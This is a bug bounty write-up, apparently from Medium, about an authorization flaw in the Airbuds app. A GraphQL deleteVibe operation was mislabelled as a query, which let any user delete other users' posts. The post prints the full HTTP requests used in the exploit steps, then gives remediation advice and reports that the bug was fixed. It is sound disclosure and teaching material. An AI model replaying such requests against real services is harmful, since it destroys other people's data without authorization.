# Airbuds Bug Bounty

- **Source URL:** https://medium.com/@okandriy/airbuds-bug-bounty-how-i-deleted-anyones-post-with-a-single-request-f639f840cd0d
- **Fetched from:** https://medium.com/@okandriy/airbuds-bug-bounty-how-i-deleted-anyones-post-with-a-single-request-f639f840cd0d?source=rss-9036f933b836------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14899 (id 14899)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Andriy Melnyk / Sat, 05 Sep 2026 18:21:46 GMT

**Author:** Andriy Melnyk

**Target:** Airbuds (com.capp.poplive)

**Platform:** iOS / Android

**Reported:** July 2026

**Status:** Fixed and credited on [airbuds.fm/security/thanks](https://airbuds.fm/security/thanks)

Airbuds is a music-based social media app where you can share what you’re listening to in real time, react to your friends’ taste, and post “vibes” (basically short status posts). I did an authorized security review of the app and found a fun one: a mislabelled GraphQL operation that let any logged-in user permanently delete anyone else’s vibe. No special privileges needed.

Here’s how it went.

First step was getting a feel for the attack surface. My usual setup:

Honestly, this recon didn’t surface as much as I expected it to, but through Burp Suite and the AndroidManifest.xml, I quickly found that the app runs on **Apollo GraphQL**, confirmed by ApolloInitializer showing up in the startup provider. All API traffic goes through one endpoint:

POST https://graph2.api.airbuds.fm/query

One thing worth noting: the JWTs are signed with **EdDSA** (Edwards-curve Digital Signature Algorithm). That means you can’t tamper with or forge tokens without the server’s private key, so token manipulation was off the table straight away. The auth layer itself seems quite solid.

The interesting stuff was elsewhere.

The deleteVibe GraphQL operation doesn't check whether the user making the request actually *owns* the vibe they're trying to delete. You just need a valid vibe ID and a valid auth token. It doesn't matter whose vibe it is. Just send the request and the vibe's gone.

That’s a classic **IDOR** (Insecure Direct Object Reference). You’re passing in an ID that references an object, and the server isn’t checking whether you’re allowed to touch it or not.

This is the interesting part. GraphQL has two operation types that matter here:

While going through all the intercepted traffic in Burp, I noticed something odd. Every write operation in the app was correctly labeled as a mutation:

X-Apollo-Operation-Type: mutation  ← setCurrentUserMusicStatus

X-Apollo-Operation-Type: mutation ← setBirthdate

X-Apollo-Operation-Type: mutation ← ReactToPromptAnswer

X-Apollo-Operation-Type: mutation ← ReportVibe

X-Apollo-Operation-Type: mutation ← SaveProfileSpace

X-Apollo-Operation-Type: mutation ← DeletePrompt

Except one. deleteVibe, a permanently destructive operation, was labeled as a **query**:

X-Apollo-Operation-Type: query  ← DeleteVibe  ⚠️

To be clear, this isn’t only a cosmetic issue. The backend’s authorization middleware almost certainly branches on operation type. Because deleteVibe seemed like a harmless read operation, it completely skipped the ownership checks that every mutation has to go through. Nobody ever enforced "does this user own this vibe?". The check just wasn't there.

The mislabelling probably happened on the client side in the Apollo iOS SDK and was never caught because, from a developer’s perspective, it *worked* as intended and vibes got deleted. The bug was invisible during normal testing.

The steps are pretty simple:

**Step 1: Grab the target vibe ID by reporting it**

POST /query HTTP/2

Host: graph2.api.airbuds.fm

Content-Type: application/json

Accept: multipart/mixed;deferSpec=20220824,application/graphql-response+json,application/json

Apollographql-Client-Version: 1.18.4-372

Authorization: Bearer \[REDACTED\]

Priority: u=3, i

Accept-Language: en-GB,en;q=0.9

Accept-Encoding: gzip, deflate, br

X-Trace-Id: \[REDACTED\]

User-Agent: Poplive/372 CFNetwork/3860.200.71 Darwin/25.1.0

X-Apollo-Operation-Type: mutation

Apollographql-Client-Name: com.capp.poplive-apollo-ios

X-Apollo-Operation-Name: ReportVibe

```
{
  "extensions": { "clientLibrary": { "name": "apollo-ios", "version": "1.22.0" } },
  "operationName": "ReportVibe",
  "query": "mutation ReportVibe($vibeId: ID!) { reportVibeOffensive(vibeId: $vibeId) }",
  "variables": { "vibeId": "[TARGET_VIBE_ID]" }
}
```
ReportVibe is correctly labeled as a mutation — nothing weird here, this is just how we get the ID.

**Step 2: Delete the target’s vibe**

POST /query HTTP/2

Host: graph2.api.airbuds.fm

Content-Type: application/json

Accept: multipart/mixed;deferSpec=20220824,application/graphql-response+json,application/json

Apollographql-Client-Version: 1.18.4-372

Authorization: Bearer \[REDACTED\]

Priority: u=3, i

Accept-Language: en-GB,en;q=0.9

Accept-Encoding: gzip, deflate, br

X-Trace-Id: \[REDACTED\]

User-Agent: Poplive/372 CFNetwork/3860.200.71 Darwin/25.1.0

X-Apollo-Operation-Type: query

Apollographql-Client-Name: com.capp.poplive-apollo-ios

X-Apollo-Operation-Name: DeleteVibe

```
{
  "extensions": { "clientLibrary": { "name": "apollo-ios", "version": "1.22.0" } },
  "operationName": "DeleteVibe",
  "query": "query DeleteVibe($vibeId: ID!) { deleteVibe(vibeID: $vibeId) }",
  "variables": { "vibeId": "[TARGET_VIBE_ID]" }
}
```
Notice: DeleteVibe is labeled query which is the emphasis of this write up.

**Response:**

HTTP/2 200 OK

Content-Type: application/json

`{"data":{"deleteVibe":true}}`
Done. The vibe is wiped from the database and disappears from everyone’s feeds immediately.

Two things need to happen and both are important:

**Fix 1: Reclassify deleteVibe as a mutation (the obvious one):**

\# What it was:

query DeleteVibe($vibeId: ID!) { deleteVibe(vibeID: $vibeId) }

\# What it should be:

mutation DeleteVibe($vibeId: ID!) { deleteVibe(vibeID: $vibeId) }

**Fix 2: Add a server-side ownership check (the important one):**

Honestly, Fix 1 alone isn’t enough. Authorization should never rely purely on how the client labels an operation. The resolver itself needs to verify ownership:

1\. Extract user ID from the JWT

2. Look up vibe ownership: SELECT owner\_id FROM vibes WHERE id = $vibeId

3. Check: owner\_id == authenticated\_user\_id

4. If not owner → 403 Forbidden

5. If owner → proceed with deletion

This is what a properly structured security system looks like. Even if the operation type is ever mislabelled again, the ownership check catches it. The server shouldn’t trust the client’s classification of its own requests.

**The query vs mutation distinction isn't just a game of semantics.** Middleware, rate limiters, and auth chains in GraphQL backends often behave differently depending on operation type. A write operation disguised as a read can quietly bypass all of that, which is exactly what happened here.

**“It works” isn’t the same as “it’s secure.”** From a dev’s perspective, deleteVibe was fine and vibes were deleted as expected. There was no error, no obvious failure. Security bugs like this are invisible to functional testing. You have to explicitly test cross-user authorization: can *I* do this to *someone else's* data?

**Solid auth elsewhere doesn’t guarantee it everywhere.** Most of the API was well-locked down. For example, forUserId parameters consistently returned unknown argument errors, mutations were properly gated. That made this one stray operation stand out all the more when it actually worked.

The Airbuds team were incredibly helpful, and were quick to patch the issues, giving me updates and performing excellent triage. For a fairly small company, I am very impressed with how much they care about security and how professionally the dealt with the situation.

[https://www.linkedin.com/in/andriymelnyk2005](https://www.linkedin.com/in/andriymelnyk2005/)/
